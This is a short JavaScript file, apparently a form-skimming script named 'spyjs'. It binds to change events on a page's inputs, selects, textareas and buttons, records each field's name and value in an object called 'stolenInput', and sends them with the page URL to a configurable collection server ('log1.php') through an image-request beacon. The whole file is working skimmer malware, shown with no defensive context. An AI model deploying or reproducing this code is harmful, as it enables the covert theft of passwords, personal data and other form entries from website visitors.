
var url = "http://127.0.0.1/server/";  // change URL
var debug = 1;
var currLoc = "";
spyjs_refreshEvents();

function spyjs_refreshEvents(){
	if(currLoc != location.href){
		currLoc=location.href;
		if(debug){
			console.log(currLoc);
		}
		spyjs_saveData("("+currLoc+")");
	}
	$('input').unbind('change');
	$('input').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	$('select').unbind('change');
	$('select').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	$('checkbox').unbind('change');
	$('checkbox').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	$('button').unbind('change');
	$('button').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	
	$('textarea').unbind('change');
	$('textarea').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
}
	
function spyjs_getInput(inputInfo){
	 
	var name = inputInfo.name;
	var value = inputInfo.value;
	var stolenInput = {};
	if(name === ""){
		name="undefined_input";
	}
	if(value != ""){
		stolenInput[name] = value;
		if(debug){
			console.log(name+"="+value);
		}
		
        var pic = new Image()
        pic.src = url+'log1.php?values='+name+"="+value +  "<br/>"+ ""+currLoc+""
		
	}
}
function spyjs_saveData(data){
	
};
 


 

